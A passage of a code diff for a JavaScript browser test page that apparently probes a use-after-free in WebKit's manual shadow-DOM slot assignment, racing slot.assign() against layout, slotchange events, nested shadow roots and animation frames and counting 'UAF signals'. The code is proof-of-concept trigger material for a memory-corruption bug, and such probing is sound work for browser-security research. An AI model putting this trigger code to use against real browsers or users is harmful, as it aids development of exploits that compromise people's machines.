-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-H: IntersectionObserver → slot.assign()               ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-
-  const cfgs=[9,17,33,65];
-  const sums=[];
-  for(const N of cfgs){
-    const r=await probePathH(`H${N}`,N);
-    log(`  ${r.sig}`,r.hit?'hit':'ok');
-    sums.push(r);
-    await delay(50);
-  }
-  log('');
-  const hits=sums.filter(r=>r.hit);
-  log(hits.length?`  !! ${hits.length} signals on PATH-H`:'  0 signals',hits.length?'hit':'inf');
-  dis(false);
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// PATH I: Nested shadow roots — inner map conflicts with outer during shared
-//         layout resolution. Two levels of manual shadow root, cross-assign nodes.
-// ─────────────────────────────────────────────────────────────────────────────
-async function probePathI(label, N){
-  // Outer shadow host
-  const outerHost=document.createElement('div');
-  outerHost.style.cssText='display:block;width:100px;height:40px;';
-  let outerSR;
-  try{ outerSR=outerHost.attachShadow({mode:'open',slotAssignment:'manual'}); }
-  catch(e){ return {sig:'NO-OUTER-SR',hit:false}; }
-  const outerSlot=document.createElement('slot');
-  outerSR.appendChild(outerSlot);
-
-  // Inner shadow host (inside outer shadow root)
-  const innerHost=document.createElement('div');
-  innerHost.style.cssText='display:block;width:80px;height:20px;';
-  let innerSR;
-  try{ innerSR=innerHost.attachShadow({mode:'open',slotAssignment:'manual'}); }
-  catch(e){ return {sig:'NO-INNER-SR',hit:false}; }
-  const innerSlot=document.createElement('slot');
-  innerSR.appendChild(innerSlot);
-  outerSR.appendChild(innerHost);
-
-  // Children in outer host's light DOM
-  const outerCh=[];
-  for(let i=0;i<N;i++){
-    const n=document.createElement('span');
-    n.textContent=`o${i}`;
-    outerHost.appendChild(n);
-    outerCh.push(n);
-  }
-
-  // Children in inner host's light DOM
-  const innerCh=[];
-  for(let i=0;i<N;i++){
-    const n=document.createElement('span');
-    n.textContent=`i${i}`;
-    innerHost.appendChild(n);
-    innerCh.push(n);
-  }
-
-  RIG.appendChild(outerHost);
-  void outerHost.getBoundingClientRect();
-
-  let threw=false, threwMsg='';
-
-  // Fill BOTH maps simultaneously
-  try{ outerSlot.assign(...outerCh.slice(0,N)); }
-  catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-outer-fill-threw`); }
-  try{ innerSlot.assign(...innerCh.slice(0,N)); }
-  catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-inner-fill-threw`); }
-
-  // Force layout on nested structure (both maps must be iterated)
-  void outerHost.getBoundingClientRect();
-
-  // Add slotchange listener that cross-modifies BOTH maps
-  let scCount=0;
-  outerSlot.addEventListener('slotchange',()=>{
-    scCount++;
-    if(scCount===1){
-      // Shrink outer while inner is being resolved
-      try{ outerSlot.assign(); }catch(e){ noteUAF(`${label}-outer-sc-shrink-threw`); }
-      // Simultaneously shrink inner
-      try{ innerSlot.assign(); }catch(e){ noteUAF(`${label}-inner-sc-shrink-threw`); }
-      // Force re-layout (re-enter resolution while maps are half-modified)
-      void outerHost.getBoundingClientRect();
-    }
-  });
-
-  // Now shrink outer map to trigger slotchange
-  try{
-    if(N>0) outerSlot.assign(...outerCh.slice(0,Math.max(1,Math.floor(N/8))));
-    else outerSlot.assign();
-  }catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-outer-shrink-threw`); }
-
-  void outerHost.getBoundingClientRect();
-
-  return new Promise(resolve=>{
-    setTimeout(()=>{
-      let oLen=-1, iLen=-1;
-      try{ oLen=outerSlot.assignedElements().length; }catch(e){ oLen=-999; noteUAF(`${label}-oLen-threw`); }
-      try{ iLen=innerSlot.assignedElements().length; }catch(e){ iLen=-999; noteUAF(`${label}-iLen-threw`); }
-      try{ RIG.removeChild(outerHost); }catch(_){}
-      const hit=threw||oLen===-999||iLen===-999;
-      const sig=`[${label}] N=${N} sc=${scCount} | outer=${oLen} inner=${iLen} threw=${threw}`;
-      resolve({sig,hit});
-    },150);
-  });
-}
-
-async function runPathI(){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-I: nested shadow roots · dual-map cross-conflict       ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-
-  const cfgs=[9,17,33,65];
-  const sums=[];
-  for(const N of cfgs){
-    const r=await probePathI(`I${N}`,N);
-    log(`  ${r.sig}`,r.hit?'hit':'ok');
-    sums.push(r);
-    await delay(30);
-  }
-  log('');
-  const hits=sums.filter(r=>r.hit);
-  log(hits.length?`  !! ${hits.length} signals on PATH-I`:'  0 signals',hits.length?'hit':'inf');
-  dis(false);
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// PATH J: requestAnimationFrame tight loop — race layout with slot.assign()
-//
-// Fire slot.assign() from RAF callback (during rendering pipeline).
-// Also: trigger slotchange during RAF, then slot.assign() in slotchange.
-// The aim: hit the window where WebKit has begun iterating the map for layout
-// but hasn't completed slot resolution yet.
-// ─────────────────────────────────────────────────────────────────────────────
-async function runPathJ(){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-J: RAF tight loop · race layout + slot.assign()       ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-
-  const N=33;
-  const rig=makeRig('J',N+4);
-  if(!rig){ log('  NO-RIG','bad'); dis(false); return; }
-
-  let hit=0, ok=0, iteration=0, threw=false;
-  const TOTAL=100;
-
-  return new Promise(resolve=>{
-    function frame(){
-      iteration++;
-      if(iteration>TOTAL){
-        try{ RIG.removeChild(rig.host); }catch(_){}
-        log('');
-        log(`  RAF DONE ${TOTAL} frames: ok=${ok} hit=${hit} uaf=${uafTotal}`,hit>0?'hit':'ok');
-        if(!hit) log('  0 signals — no race window found','inf');
-        dis(false);
-        resolve();
-        return;
-      }
-
-      // Each RAF: fill → force layout → shrink → read
-      try{
-        rig.slot.assign(...rig.ch.slice(0,N));
-        void rig.host.getBoundingClientRect();
-        rig.slot.assign();
-        const post=rig.slot.assignedElements().length;
-        if(post!==0){ hit++; noteUAF(`J-state-corrupt:post=${post}`); }
-        else ok++;
-      }catch(e){
-        hit++; threw=true;
-        noteUAF(`J-frame-threw:${e.message.substring(0,40)}`);
-      }
-
-      if(iteration%25===0){
-        log(`  RAF ${iteration}/${TOTAL}: ok=${ok} hit=${hit}`,hit>0?'hit':'dim');
-      }
-
-      requestAnimationFrame(frame);
-    }
-
-    log(`  Running ${TOTAL} RAF frames with fill=${N}→shrink=0...`,'inf');
-    requestAnimationFrame(frame);
-  });
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// LOOP ×500: Best stress config from PATH-E (most likely re-entrant path)
-// ─────────────────────────────────────────────────────────────────────────────
-async function runLoop(){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  LOOP ×500 · PATH-E config (slotchange re-entrant)          ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-
-  let ok=0, hit=0;
-  for(let i=0;i<500;i++){
-    const r=await probePathE(`lp${i}`, 33, 0);
-    if(r.hit) hit++;
-    else ok++;
-    if(i%100===99){
-      log(`  ${i+1}/500: ok=${ok} hit=${hit} uaf=${uafTotal}`,hit>0?'hit':'dim');
-      await tick();
+    if((i+1) % 50 === 0){
+      log(`  ${i+1}/${RUNS}: ok=${ok} sigs=${sigs}`,'inf');
+      await nextTick();
     }
   }
-  log('');
-  log(`  DONE 500: ok=${ok} hit=${hit} uaf=${uafTotal}`,hit>0?'hit':'ok');
-  dis(false);
+  log(`\n  DONE ${RUNS}: ok=${ok} sigs=${sigs}`, sigs>0?'bad':'ok');
+  if(!_inRunAll) dis(false);
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// RUN ALL
-// ─────────────────────────────────────────────────────────────────────────────
+/* ══════════════════════════════════════════════
+   RUN ALL
+   ══════════════════════════════════════════════ */
 async function runAll(){
-  _inRunAll=true;
+  _inRunAll = true;
   dis(true); L.innerHTML=''; uafTotal=0;
+
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  v100 RUN ALL · re-entrant WeakHashMap modification paths   ║','hi');
+  log('║  v101 RUN ALL · ManualSlot m_slots WeakHashMap rehash UAF   ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-  log('━━━━━━━━━━━━ PATH-E: slotchange+layout ━━━━━━━━━━━━','hi');
+  log('','');
+  log('  Commit: 0bab5af95da144b45e240675e21391b3f5518a30 (2026-08-13)','inf');
+  log('  Title:  UAF in ManualSlotAssignment via WeakHashMap rehash during reentrant composed-tree teardown','inf');
+  log('','');
+
+  await runPathA();
+  await runPathB();
+  await runPathC();
+  await runPathD();
   await runPathE();
-  log('');
-  log('━━━━━━━━━━━━ PATH-F: MutationObserver ━━━━━━━━━━━━','hi');
-  await runPathF();
-  log('');
-  log('━━━━━━━━━━━━ PATH-G: ResizeObserver ━━━━━━━━━━━━','hi');
-  await runPathG();
-  log('');
-  log('━━━━━━━━━━━━ PATH-H: IntersectionObserver ━━━━━━━━━━━━','hi');
-  await runPathH();
-  log('');
-  log('━━━━━━━━━━━━ PATH-I: nested shadows ━━━━━━━━━━━━','hi');
-  await runPathI();
-  log('');
-  log('━━━━━━━━━━━━ PATH-J: RAF tight loop ━━━━━━━━━━━━','hi');
-  await runPathJ();
-  log('');
-  log('━━━━━━━━━━━━ LOOP ×500 ━━━━━━━━━━━━','hi');
-  await runLoop();
-  log('');
-  log(`══════════════════════════════════════════════════════════════`,'hi');
-  log(`  v100 RUN ALL COMPLETE · total UAF signals: ${uafTotal}`,'hi');
-  log(`══════════════════════════════════════════════════════════════`,'hi');
-  _inRunAll=false;
+
+  log('','');
+  log('══════════════════════════════════════════════════════════════','hi');
+  log(`  v101 RUN ALL COMPLETE · total UAF signals: ${uafTotal}`, uafTotal>0?'hit':'ok');
+  log('══════════════════════════════════════════════════════════════','hi');
+
+  _inRunAll = false;
   dis(false);
   copyLog();
 }
